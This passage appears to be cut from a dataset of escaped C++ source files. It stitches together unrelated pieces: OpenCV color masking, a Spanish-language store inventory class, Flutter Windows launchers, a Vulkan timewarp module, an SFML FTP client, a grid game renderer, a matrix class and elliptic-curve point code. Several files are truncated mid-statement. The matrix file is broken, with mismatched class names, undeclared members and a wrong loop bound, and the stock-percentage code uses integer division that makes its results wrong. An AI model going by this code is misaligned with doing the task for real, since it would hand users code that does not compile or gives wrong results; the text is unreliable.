HSV \u8303\u56f4\n    cv::Scalar lowerRed1(0, 100, 100); // \u7ea2\u8272\u7684\u4e0b\u9650\uff08\u8303\u56f41\uff09\n    cv::Scalar upperRed1(10, 255, 255); // \u7ea2\u8272\u7684\u4e0a\u9650\uff08\u8303\u56f41\uff09\n\n    cv::Scalar lowerRed2(160, 100, 100); // \u7ea2\u8272\u7684\u4e0b\u9650\uff08\u8303\u56f42\uff09\n    cv::Scalar upperRed2(180, 255, 255); // \u7ea2\u8272\u7684\u4e0a\u9650\uff08\u8303\u56f42\uff09\n\n    // \u521b\u5efa\u63a9\u6a21\n    cv::Mat mask1, mask2, mask;\n\n    // \u63d0\u53d6\u7ea2\u8272\u533a\u57df\u7684\u63a9\u6a21\uff08\u8303\u56f41\uff09\n    cv::inRange(hsvImage, lowerRed1, upperRed1, mask1);\n    \n    // \u63d0\u53d6\u7ea2\u8272\u533a\u57df\u7684\u63a9\u6a21\uff08\u8303\u56f42\uff09\n    cv::inRange(hsvImage, lowerRed2, upperRed2, mask2);\n\n    // \u5408\u5e76\u4e24\u4e2a\u63a9\u6a21\n    cv::add(mask1, mask2, mask);\n\n    // \u4f7f\u7528\u63a9\u6a21\u63d0\u53d6\u7ea2\u8272\u533a\u57df\n    cv::Mat redRegion;\n    cv::bitwise_and(image, image, redRegion, mask);\n\n    // \u4fdd\u5b58\u63a9\u6a21\u548c\u63d0\u53d6\u7684\u7ea2\u8272\u533a\u57df\n    if (!cv::imwrite(\"/home/panchant/Developing Software/Git/repo/XJTU-RMV-Task02/opencv_project/resources/red_mask.jpg\", mask)) {\n        std::cerr << \"Error: Unable to save red mask image!\" << std::endl;\n        return -1;\n    }\n\n    if (!cv::imwrite(\"/home/panchant/Developing Software/Git/repo/XJTU-RMV-Task02/opencv_project/resources/red_region.jpg\", redRegion)) {\n        std::cerr << \"Error: Unable to save red region image!\" << std::endl;\n        return -1;\n    }\n\n    // \u663e\u793a\u539f\u56fe\u50cf\u3001\u63a9\u6a21\u548c\u7ea2\u8272\u533a\u57df\n    cv::imshow(\"Original Image\", image);\n    cv::imshow(\"Red Mask\", mask);\n    cv::imshow(\"Red Region\", redRegion);\n\n    // \u67e5\u627e\u8f6e\u5ed3\n    std::vector<std::vector<cv::Point>> contours;\n    std::vector<cv::Vec4i> hierarchy;\n    cv::findContours(mask, contours, hierarchy, cv::RETR_EXTERNAL, cv::CHAIN_APPROX_SIMPLE);\n\n    // \u7ed8\u5236\u8f6e\u5ed3\n    cv::Mat contourImage = image.clone();\n    cv::drawContours(contourImage, contours, -1, cv::Scalar(0, 255, 0), 2);\n\n    // \u4fdd\u5b58\u8f6e\u5ed3\u56fe\u50cf\n    if (!cv::imwrite(\"/home/panchant/Developing Software/Git/repo/XJTU-RMV-Task02/opencv_project/resources/contour_image.jpg\", contourImage)) {\n        std::cerr << \"Error: Unable to save contour image!\" << std::endl;\n        return -1;\n    }\n\n    // \u663e\u793a\u8f6e\u5ed3\u56fe\u50cf\n    cv::imshow(\"Contours\", contourImage);\n\n    // \u521b\u5efa\u7528\u4e8e\u7ed8\u5236\u8fb9\u754c\u6846\u7684\u56fe\u50cf\n    cv::Mat boundingBoxImage = image.clone();\n\n    for (const auto& contour : contours) {\n        // \u8ba1\u7b97\u8fb9\u754c\u6846\n        cv::Rect boundingBox = cv::boundingRect(contour);\n\n        // \u8ba1\u7b97\u8f6e\u5ed3\u9762\u79ef\n        double area = cv::contourArea(contour);\n\n        // \u7ed8\u5236\u8fb9\u754c\u6846\n        cv::rectangle(boundingBoxImage, boundingBox, cv::Scalar(0, 255, 0), 2);\n\n        // \u51c6\u5907\u6587\u672c\u4fe1\u606f\n        std::string text = \"Area: \" + std::to_string(static_cast<int>(area));\n\n        // \u8bbe\u7f6e\u5b57\u4f53\u3001\u5927\u5c0f\u548c\u7c97\u7ec6\n        int fontFace = cv::FONT_HERSHEY_SIMPLEX;\n        double fontScale = 0.8;\n        int thickness = 2;\n\n        // \u8ba1\u7b97\u6587\u672c\u5927\u5c0f\n        int baseline;\n        cv::Size textSize = cv::getTextSize(text, fontFace, fontScale, thickness, &baseline);\n\n        // \u8bbe\u7f6e\u6587\u672c\u80cc\u666f\u77e9\u5f62\n        cv::Rect textRect(boundingBox.tl(), cv::Size(textSize.width, textSize.height + baseline));\n        cv::rectangle(boundingBoxImage, textRect, cv::Scalar(0, 0, 0), cv::FILLED);\n\n        // \u7ed8\u5236\u6587\u672c\n        cv::putText(boundingBoxImage, text, boundingBox.tl() + cv::Point(0, textSize.height), fontFace, fontScale, cv::Scalar(255, 255, 255), thickness);\n    }\n\n    // \u4fdd\u5b58\u8fb9\u754c\u6846\u56fe\u50cf\n    if (!cv::imwrite(\"/home/panchant/Developing Software/Git/repo/XJTU-RMV-Task02/opencv_project/resources/bounding_box_image.jpg\", boundingBoxImage)) {\n        std::cerr << \"Error: Unable to save bounding box image!\" << std::endl;\n        return -1;\n    }\n\n    // \u663e\u793a\u8fb9\u754c\u6846\u56fe\u50cf\n    cv::imshow(\"Bounding Boxes\", boundingBoxImage);\n\n    // \u63d0\u53d6\u989c\u8272\u533a\u57df\n    cv::Mat colorRegion;\n    cv::bitwise_and(image, image, colorRegion, mask);\n\n    // \u5c06\u63d0\u53d6\u7684\u989c\u8272\u533a\u57df\u8f6c\u6362\u4e3a\u7070\u5ea6\u56fe\u50cf\n    cv::Mat grayImage;\n    cv::cvtColor(colorRegion, grayImage, cv::COLOR_BGR2GRAY);\n\n    // \u5e94\u7528\u4e8c\u503c\u5316\n    cv::Mat binaryImage;\n    cv::threshold(grayImage, binaryImage, 127, 255, cv::THRESH_BINARY);\n\n    // \u4fdd\u5b58\u7070\u5ea6\u56fe\u50cf\u548c\u4e8c\u503c\u5316\u56fe\u50cf\n    if (!cv::imwrite(\"/home/panchant/Developing Software/Git/repo/XJTU-RMV-Task02/opencv_project/resources/gray_image.jpg\", grayImage)) {\n        std::cerr << \"Error: Unable to save gray image!\" << std::endl;\n        return -1;\n    }\n\n    if (!cv::imwrite(\"/home/panchant/Developing Software/Git/repo/XJTU-RMV-Task02/opencv_project/resources/binary_image.jpg\", binaryImage)) {\n        std::cerr << \"Error: Unable to save binary image!\" << std::endl;\n        return -1;\n    }\n\n    // \u663e\u793a\u7070\u5ea6\u56fe\u50cf\u548c\u4e8c\u503c\u5316\u56fe\u50cf\n    cv::imshow(\"Gray Image\", grayImage);\n    cv::imshow(\"Binary Image\", binaryImage);\n\n    // \u5e94\u7528\u81a8\u80c0\n    cv::Mat dilatedImage;\n    cv::Mat kernel = cv::getS",
    "#include \"Tienda.h\"\n#include <iostream>\n#include \"Validaciones.h\"\n\n\nTienda::Tienda(){}\n\nTienda::~Tienda(){}\n\nProducto& Tienda::getProducto(int \u00edndice)\n{\n    return totalProductos[\u00edndice];\n}\n\nvoid Tienda::ingresarProducto(Validaciones& val)\n{\n    string nombre, nombreM=\"\";\n    double precio;\n    int stock, \u00edndice, marca;\n    bool repetido=false;\n    \u00edndice=stoi(val.leerI(1,\"\\nDigite (del 1 al 10) el n\u00famero del producto a ingresar: \",10))-1;\n    nombre=val.leer(\"\\nDigite el nombre del producto: \");\n    precio=stod(val.leerD(0,\"\\nDigite el precio del producto: \"));\n    stock=stoi(val.leerI(0,\"\\nDigite el stock del producto: \"));\n    for(int i=0; i<nombre.length();i++)\n    {\n        nombreM+=tolower(nombre[i]);\n    }\n    for(int i=0; i<10; i++)\n    {\n        if(getProducto(i).getNombre()==nombreM)\n        {\n            repetido=true;\n            marca=i;\n        }\n    }\n    if(repetido==true)\n    {\n        stock=stoi(val.leerI(0,\"\\nProducto ya existente. Solo puede actualizar su stock: \"));\n        getProducto(marca).setStock(stock);\n    }\n    else\n    {\n        getProducto(\u00edndice).setNombre(nombreM);\n        getProducto(\u00edndice).setPrecio(precio);\n        getProducto(\u00edndice).setStock(stock);\n        cout<<\"\\nProducto creado!!!\"<<endl;\n    }\n}\nstring Tienda::mostrarProductos()\n{\n    string lista=\"\";\n    for(int i=0; i<10; i++)\n    {\n        if(getProducto(i).getNombre()!=\"\")\n        {\n            lista+=getProducto(i).getNombre()+\" \"+to_string(getProducto(i).getPrecio())+\" \"+to_string(getProducto(i).getStock())+\"\\n\";\n        }\n    }\n    lista+=\"Productos mostrados con \u00e9xito!!!!\";\n    return lista;\n}\n\nstring Tienda::buscarPorNombre(Validaciones& val)\n{\n    string nombre, nombreM=\"\", lista=\"\";\n    nombre=val.leer(\"\\nDigite el nombre del producto a buscar: \");\n    for(int i=0; i<nombre.length(); i++)\n    {\n        nombreM+=tolower(nombre[i]);\n    }\n\n    for(int i=0; i<10; i++)\n    {\n        if(getProducto(i).getNombre().find(nombreM)!=string::npos)\n        {\n            lista+=getProducto(i).getNombre()+\" \"+to_string(getProducto(i).getPrecio())+\" \"+to_string(getProducto(i).getStock())+\"\\n\";\n        }\n    }\n    lista+=\"Productos equivalentes mostrados!!\\n\";\n    return lista;\n}\nstring Tienda::calcularStock()\n{\n    int totalStock=0;\n    string lista=\"\";\n    for(int i=0; i<10; i++)\n    {\n        totalStock+=getProducto(i).getStock();\n    }\n    lista+=\"Total de productos en stock: \"+to_string(totalStock)+\"\\n\";\n    for(int i=0; i<10; i++)\n    {\n        if(getProducto(i).getNombre()!=\"\")\n            lista+=getProducto(i).getNombre()+\" \"+to_string(getProducto(i).getStock())+\" \"+to_string((getProducto(i).getStock()/totalStock)*100)+\"%\"+\"\\n\";\n    }\n    return lista;\n}\nstring Tienda::buscarPorRangoPrecios(Validaciones& val)\n{\n    double rangoInicio, rangoFinal;\n    rangoInicio=stod(val.leerD(0,\"\\nDigite el inicio del rango de precios: \"));\n    rangoFinal=stod(val.leerD(rangoInicio,\"\\nDigite el final del rango de precios: \"));\n    string lista=\"\\n\";\n    for(int i=0; i<10; i++)\n    {\n        if(getProducto(i).getPrecio()<=rangoFinal and getProducto(i).getPrecio()>=rangoInicio)\n        {\n            lista+=getProducto(i).getNombre()+\"\\n\";\n        }\n    }\n    return lista;\n}\nvoid Tienda::modificarPrecio(Validaciones& val)\n{\n    string nombre, nombreM=\"\";\n    double precio;\n    nombre=val.leer(\"Digite el nombre del producto: \");\n    for(int i=0; i<nombre.length();i++)\n    {\n        nombreM+=tolower(nombre[i]);\n    }\n    for(int i=0; i<10; i++)\n    {\n        if(getProducto(i).getNombre()==nombreM)\n        {\n            cout<<\"El precio actual del producto \"<<getProducto(i).getNombre()<<\" es: \"<<getProducto(i).getPrecio()<<endl;\n            precio=stod(val.leerD(0,\"Digite el nuevo precio: \"));\n            getProducto(i).setPrecio(precio);\n            cout<<\"\\nPrecio ingresado con \u00e9xito!!\"<<endl;\n            break;\n        }\n\n    }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"pks_practice_3\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <future>\n#include <iostream>\n#include <mutex>\n#include <stack>\n\n#define VMA_IMPLEMENTATION\n\n#include \"illixr/data_format.hpp\"\n#include \"illixr/global_module_defs.hpp\"\n#include \"illixr/math_util.hpp\"\n#include \"illixr/phonebook.hpp\"\n#include \"illixr/pose_prediction.hpp\"\n#include \"illixr/switchboard.hpp\"\n#include \"illixr/threadloop.hpp\"\n#include \"illixr/vk_util/display_sink.hpp\"\n#include \"illixr/vk_util/render_pass.hpp\"\n#include \"illixr/vk_util/vulkan_utils.hpp\"\n#include \"utils/hmd.hpp\"\n\n#include <vulkan/vulkan_core.h>\n\nusing namespace ILLIXR;\n\nstruct Vertex {\n    glm::vec3 pos;\n    glm::vec2 uv0;\n    glm::vec2 uv1;\n    glm::vec2 uv2;\n\n    static VkVertexInputBindingDescription get_binding_description() {\n        VkVertexInputBindingDescription binding_description = {};\n        binding_description.binding                         = 0;              // index of the binding in the array of bindings\n        binding_description.stride                          = sizeof(Vertex); // number of bytes from one entry to the next\n        binding_description.inputRate                       = VK_VERTEX_INPUT_RATE_VERTEX; // no instancing\n\n        return binding_description;\n    }\n\n    static std::array<VkVertexInputAttributeDescription, 4> get_attribute_descriptions() {\n        std::array<VkVertexInputAttributeDescription, 4> attribute_descriptions = {};\n\n        // position\n        attribute_descriptions[0].binding  = 0;                          // which binding the per-vertex data comes from\n        attribute_descriptions[0].location = 0;                          // location directive of the input in the vertex shader\n        attribute_descriptions[0].format   = VK_FORMAT_R32G32B32_SFLOAT; // format of the data\n        attribute_descriptions[0].offset =\n            offsetof(Vertex, pos); // number of bytes since the start of the per-vertex data to read from\n\n        // uv0\n        attribute_descriptions[1].binding  = 0;\n        attribute_descriptions[1].location = 1;\n        attribute_descriptions[1].format   = VK_FORMAT_R32G32_SFLOAT;\n        attribute_descriptions[1].offset   = offsetof(Vertex, uv0);\n\n        // uv1\n        attribute_descriptions[2].binding  = 0;\n        attribute_descriptions[2].location = 2;\n        attribute_descriptions[2].format   = VK_FORMAT_R32G32_SFLOAT;\n        attribute_descriptions[2].offset   = offsetof(Vertex, uv1);\n\n        // uv2\n        attribute_descriptions[3].binding  = 0;\n        attribute_descriptions[3].location = 3;\n        attribute_descriptions[3].format   = VK_FORMAT_R32G32_SFLOAT;\n        attribute_descriptions[3].offset   = offsetof(Vertex, uv2);\n\n        return attribute_descriptions;\n    }\n};\n\nstruct UniformBufferObject {\n    glm::mat4 timewarp_start_transform;\n    glm::mat4 timewarp_end_transform;\n};\n\nclass timewarp_vk : public timewarp {\npublic:\n    explicit timewarp_vk(const phonebook* const pb)\n        : pb{pb}\n        , sb{pb->lookup_impl<switchboard>()}\n        , pp{pb->lookup_impl<pose_prediction>()}\n        , disable_warp{ILLIXR::str_to_bool(ILLIXR::getenv_or(\"ILLIXR_TIMEWARP_DISABLE\", \"False\"))} { }\n\n    void initialize() {\n        ds = pb->lookup_impl<display_sink>();\n\n        if (ds->vma_allocator) {\n            this->vma_allocator = ds->vma_allocator;\n        } else {\n            this->vma_allocator = vulkan_utils::create_vma_allocator(ds->vk_instance, ds->vk_physical_device, ds->vk_device);\n            deletion_queue.emplace([=]() {\n                vmaDestroyAllocator(vma_allocator);\n            });\n        }\n\n        generate_distortion_data();\n        command_pool   = vulkan_utils::create_command_pool(ds->vk_device, ds->graphics_queue_family);\n        command_buffer = vulkan_utils::create_command_buffer(ds->vk_device, command_pool);\n        deletion_queue.emplace([=]() {\n            vkDestroyCommandPool(ds->vk_device, command_pool, nullptr);\n        });\n        create_vertex_buffer();\n        create_index_buffer();\n        create_descriptor_set_layout();\n        create_uniform_buffer();\n        create_texture_sampler();\n    }\n\n    void setup(VkRenderPass render_pass, uint32_t subpass, std::array<std::vector<VkImageView>, 2> buffer_pool_in,\n               bool input_texture_vulkan_coordinates_in) override {\n        std::lock_guard<std::mutex> lock{m_setup};\n\n        this->input_texture_vulkan_coordinates = input_texture_vulkan_coordinates_in;\n        if (!initialized) {\n            initialize();\n            initialized = true;\n        } else {\n            partial_destroy();\n        }\n\n        if (buffer_pool_in[0].size() != buffer_pool_in[1].size()) {\n            throw std::runtime_error(\"timewarp_vk: buffer_pool[0].size() != buffer_pool[1].size()\");\n        }\n        this->buffer_pool = buffer_pool_in;\n\n        create_descriptor_pool();\n        create_descriptor_sets();\n        create_pipeline(render_pass, subpass);\n    }\n\n    void partial_destroy() {\n        vkDestroyPipeline(ds->vk_device, pipeline, nullptr);\n        pipeline = VK_NULL_HANDLE;\n\n     ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"noted\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\n////////////////////////////////////////////////////////////\n// Headers\n////////////////////////////////////////////////////////////\n#include <SFML/Network.hpp>\n#include <fstream>\n#include <iostream>\n\n\n////////////////////////////////////////////////////////////\n/// Print a FTP response into a standard output stream\n///\n////////////////////////////////////////////////////////////\nstd::ostream& operator <<(std::ostream& stream, const sf::Ftp::Response& response)\n{\n    return stream << response.getStatus() << response.getMessage();\n}\n\n\n////////////////////////////////////////////////////////////\n/// Entry point of application\n///\n/// \\return Application exit code\n///\n////////////////////////////////////////////////////////////\nint main()\n{\n    // Choose the server address\n    sf::IpAddress address;\n    do\n    {\n        std::cout << \"Enter the FTP server address: \";\n        std::cin  >> address;\n    }\n    while (address == sf::IpAddress::None);\n\n    // Connect to the server\n    sf::Ftp server;\n    sf::Ftp::Response connectResponse = server.connect(address);\n    std::cout << connectResponse << std::endl;\n    if (!connectResponse.isOk())\n        return EXIT_FAILURE;\n\n    // Ask for user name and password\n    std::string user, password;\n    std::cout << \"User name: \";\n    std::cin  >> user;\n    std::cout << \"Password: \";\n    std::cin  >> password;\n\n    // Login to the server\n    sf::Ftp::Response loginResponse = server.login(user, password);\n    std::cout << loginResponse << std::endl;\n    if (!loginResponse.isOk())\n        return EXIT_FAILURE;\n\n    // Main menu\n    int choice = 0;\n    do\n    {\n        // Main FTP menu\n        std::cout << std::endl;\n        std::cout << \"Choose an action:\"                      << std::endl;\n        std::cout << \"1. Print working directory\"             << std::endl;\n        std::cout << \"2. Print contents of working directory\" << std::endl;\n        std::cout << \"3. Change directory\"                    << std::endl;\n        std::cout << \"4. Create directory\"                    << std::endl;\n        std::cout << \"5. Delete directory\"                    << std::endl;\n        std::cout << \"6. Rename file\"                         << std::endl;\n        std::cout << \"7. Remove file\"                         << std::endl;\n        std::cout << \"8. Download file\"                       << std::endl;\n        std::cout << \"9. Upload file\"                         << std::endl;\n        std::cout << \"0. Disconnect\"                          << std::endl;\n        std::cout << std::endl;\n\n        std::cout << \"Your choice: \";\n        std::cin  >> choice;\n        std::cout << std::endl;\n\n        switch (choice)\n        {\n            default:\n            {\n                // Wrong choice\n                std::cout << \"Invalid choice!\" << std::endl;\n                std::cin.clear();\n                std::cin.ignore(10000, '\\n');\n                break;\n            }\n\n            case 1:\n            {\n                // Print the current server directory\n                sf::Ftp::DirectoryResponse response = server.getWorkingDirectory();\n                std::cout << response << std::endl;\n                std::cout << \"Current directory is \" << response.getDirectory() << std::endl;\n                break;\n            }\n\n            case 2:\n            {\n                // Print the contents of the current server directory\n                sf::Ftp::ListingResponse response = server.getDirectoryListing();\n                std::cout << response << std::endl;\n                const std::vector<std::string>& names = response.getListing();\n                for (std::vector<std::string>::const_iterator it = names.begin(); it != names.end(); ++it)\n                    std::cout << *it << std::endl;\n                break;\n            }\n\n            case 3:\n            {\n                // Change the current directory\n                std::string directory;\n                std::cout << \"Choose a directory: \";\n                std::cin  >> directory;\n                std::cout << server.changeDirectory(directory) << std::endl;\n                break;\n            }\n\n            case 4:\n            {\n                // Create a new directory\n                std::string directory;\n                std::cout << \"Name of the directory to create: \";\n                std::cin  >> directory;\n                std::cout << server.createDirectory(directory) << std::endl;\n                break;\n            }\n\n            case 5:\n            {\n                // Remove an existing directory\n                std::string directory;\n                std::cout << \"Name of the directory to remove: \";\n                std::cin  >> directory;\n                std::cout << server.deleteDirectory(directory) << std::endl;\n                break;\n            }\n\n            case 6:\n            {\n                // Rename a file\n                std::string source, destination;\n                std::cout << \"Name of the file to rename: \";\n                std::cin",
    "#include \"GridRenderer.h\"\n\nGridRenderer::GridRenderer(ConsoleRenderer* console)\n{\n    m_gm = GameManager::GetInstance();\n    m_consoleRenderer = console;\n    m_levelEditor = new LevelEditor();\n    int currentLevel = m_gm->GetCurrentLevel();\n\n    std::vector<std::string> level = m_levelEditor->GetLevel(currentLevel);\n    LevelData levelData = m_levelEditor->GetLevelData(currentLevel);\n\n    m_gridHeight = level.size();\n    m_gridWidth = level[0].size();\n\n    for (const auto& row : level) {\n        m_grid.push_back(std::vector<char>(row.begin(), row.end()));\n    }\n\n    SpawnMonsters();\n    SpawnPlayer();\n    InitRandomElement(levelData.m_randomObstacles, CellType::Obstacle);\n    InitRandomElement(levelData.m_randomChests, CellType::Chest);\n    InitRandomElement(levelData.m_randomTraps, CellType::Trap);\n    SpawnChests();\n}\n\nbool GridRenderer::IsBlockedCell(pair<int, int> coord)\n{\n    int x = coord.first;\n    int y = coord.second;\n\n    return m_grid[y][x] != m_cellDatas[CellType::Empty].first\n        && m_grid[y][x] != m_cellDatas[CellType::ValidMove].first\n        && m_grid[y][x] != m_cellDatas[CellType::PreviousMove].first\n        && m_grid[y][x] != m_cellDatas[CellType::Chest].first\n        && m_grid[y][x] != m_cellDatas[CellType::Trap].first;\n}\n\nbool GridRenderer::IsEntityIcon(char icon)\n{\n    for (auto cell : m_cellDatas)\n    {\n        if (icon == cell.second.first) return false;\n    }\n\n    return true;\n}\n\nvoid GridRenderer::InitRandomElement(int nb, CellType type)\n{\n    int elementAdded = 0;\n\n    while (elementAdded < nb)\n    {\n        int r = std::rand() % m_gridHeight;\n        int c = std::rand() % m_gridWidth;\n\n        // \u00c9vite placement sur les murs, les monstres, le joueur ou les cases d\u00e9j\u00e0 occup\u00e9es\n        if (m_grid[r][c] == m_cellDatas[CellType::Empty].first)\n        {\n            m_grid[r][c] = m_cellDatas[type].first;\n            ++elementAdded;\n        }\n    }\n}\n\nvoid GridRenderer::SpawnMonsters()\n{\n    for (Monster* m : m_gm->GetMonsters())\n    {\n        bool isFound = false;\n\n        for (int y = 0; y < m_grid.size(); ++y)\n        {\n            if (isFound) break;\n\n            for (int x = 0; x < m_grid[y].size(); ++x)\n            {\n                if (m_grid[y][x] == m->GetIcon())\n                {\n                    m->SetPos(std::make_pair(x, y));\n                    isFound = true;\n                    break;\n                }\n            }\n        }\n\n        if (!isFound) m->Despawn();\n    }\n}\n\nvoid GridRenderer::SpawnPlayer()\n{\n    for (int y = 0; y < m_grid.size(); ++y)\n    {\n        for (int x = 0; x < m_grid[y].size(); ++x)\n        {\n            if (m_grid[y][x] == m_gm->GetPlayer()->GetIcon())\n            {\n                m_gm->GetPlayer()->SetPos(std::make_pair(x, y));\n                return;\n            }\n        }\n    }\n}\n\nvoid GridRenderer::SpawnChests()\n{\n    for (int y = 0; y < m_grid.size(); ++y)\n    {\n        for (int x = 0; x < m_grid[y].size(); ++x)\n        {\n            if (m_grid[y][x] == m_cellDatas[CellType::Chest].first)\n            {\n                m_chests[std::make_pair(x, y)] = new Chest();\n            }\n        }\n    }\n}",
    "#include \"example.h\"\n\nS21Matrix::S21Matrix() {\n    _rows = 3;\n    _cols = 3;\n    // that is how memory allocation works in C++\n    _p = new double[_rows * _cols]();\n}\n\n/* : <attribute_name>(value) syntax helps to automatically fill attributes with \nvalues */\nS21Matrix::S21Matrix(int rows, int cols) : _rows(rows), _cols(cols) {\n    _p = new double[_rows * _cols]();\n}\n\nS21Matrix::S21Matrix(const S21Matrix& o) : _rows(o._rows), _cols(o._cols) {\n    _p = new double[o._rows * o._cols]();\n    /* standard cpp function: copies memory of o._rows * o._cols * sizeof(double) \n    from o.p pointer to _p pointer */\n    std::memcpy(_p, o._p, o._rows * o._cols * sizeof(double));\n}\n\nS21Matrix::S21Matrix(CMatrix&& o) {\n    if (_rows * _cols == o._rows * o._cols) {\n        std::memcpy(_p, o._p, o._cols * o._rows * sizeof(double));\n    } else {\n        delete[] m_ptValues;\n        _p = new double[o._rows * o._cols]();\n        std::memcpy(_p, o._p, o._cols * o._rows * sizeof(double));\n    }\n    _rows = o._rows;\n    _cols = o._cols;\n    delete o._p;\n    o._rows = 0;\n    o._cpls = 0;\n}\n\nS21Matrix::~S21Matrix() {\n    if (_p) {\n        // free\n        delete[] _p;\n    }\n}\n\nS21Matrix::sum_matrix(const S21Matrix& o) {\n    // exception throwing example\n    if (_rows != o._rows || _cols != o._cols) {\n        throw std::out_of_range(\n            \"Incorrect input, matrices should have the same size\");\n    }\n    for (auto i = 0; i < _rows + _cols; i++) {\n        _p[i] = _p[i] + o._p[i];\n    }\n}\n\n// operator overload example\nS21Matrix S21Matrix::operator+(const S21Matrix& o) {\n    // creating result matrix\n    S21Matrix res(_rows, _cols);\n    res.sum_matrix(o);\n    return res;\n}\n\n// index operator overload\nint& CMatrix::operator()(int row, int col) {\n    if (row >= _rows || col >= _cols) {\n        throw std::out_of_range(\"Incorrect input, index is out of range\");\n    }\n    return _p[row * _cols + col];\n}\n",
    "/*\n * This file is part of the BSGS distribution (https://github.com/JeanLucPons/BSGS).\n * Copyright (c) 2020 Jean Luc PONS.\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, version 3.\n *\n * This program is distributed in the hope that it will be useful, but\n * WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program. If not, see <http://www.gnu.org/licenses/>.\n*/\n\n#include \"Point.h\"\n#include <stdio.h>\n\nPoint::Point() {\n}\n\nPoint::Point(const Point &p) {\n\n\tmpz_set(x.num,p.x.num);\n\tmpz_set(y.num,p.y.num);\n\tmpz_set(z.num,p.z.num);\n}\n\nPoint::Point(Int *cx,Int *cy,Int *cz) {\n\tmpz_set(x.num,cx->num);\n\tmpz_set(y.num,cy->num);\n\tmpz_set(z.num,cz->num);\n}\n\nvoid Point::Clear() {\n\tmpz_set_ui(x.num,0);\n\tmpz_set_ui(y.num,0);\n\tmpz_set_ui(z.num,0);\n}\n\nvoid Point::Set(Int *cx, Int *cy,Int *cz) {\n\tmpz_set(x.num,cx->num);\n\tmpz_set(y.num,cy->num);\n\tmpz_set(z.num,cz->num);\n}\n\nPoint::~Point() {\n\n}\n\nvoid Point::Set(Point &p) {\n\tmpz_set(x.num,p.x.num);\n\tmpz_set(y.num,p.y.num);\n\tmpz_set(z.num,p.z.num);\n}\n\nbool Point::isZero() {\n\treturn x.IsZero() && y.IsZero();\n}\n\nvoid Point::Reduce() {\n\tInt i(&z);\n\ti.ModInv();\n\tx.ModMul(&x,&i);\n\ty.ModMul(&y,&i);\n\tz.SetInt32(1); \n}\n\nbool Point::equals(Point &p) {\n\treturn x.IsEqual(&p.x) && y.IsEqual(&p.y) && z.IsEqual(&p.z);\n}\n\n// Copy assignment operator\nPoint& Point::operator=(const Point& other)  {\n\t// Check for self-assignment\n\tif (this == &other) {\n\t\treturn *this;\n\t}\n\t// Assign the values from 'other' to the current object\n\tmpz_set(x.num,other.x.num);\n\tmpz_set(y.num,other.y.num);\n\tmpz_set(z.num,other.z.num);\n\n\t// Return the current object\n\treturn *this;\n}\n\n/*\nvoid Point::print(const char *str)\t{\n\tchar *ptrs[3];\n\tptrs[0] = x.GetBase16();\n\tptrs[1] = y.GetBase16();\n\tptrs[2] = z.GetBase16();\n\tprintf(\"Point %s\\n\",str);\n\tprintf(\"X: %s\\n\",ptrs[0]);\n\tprintf(\"Y: %s\\n\",ptrs[1]);\n\tprintf(\"Z: %s\\n\",ptrs[2]);\n\tprintf(\"End Point\\n\");\n\tfor(int i = 0; i<3; i++)\t{\n\t\tfree(ptrs[i]);\n\t}\n}\n*/",
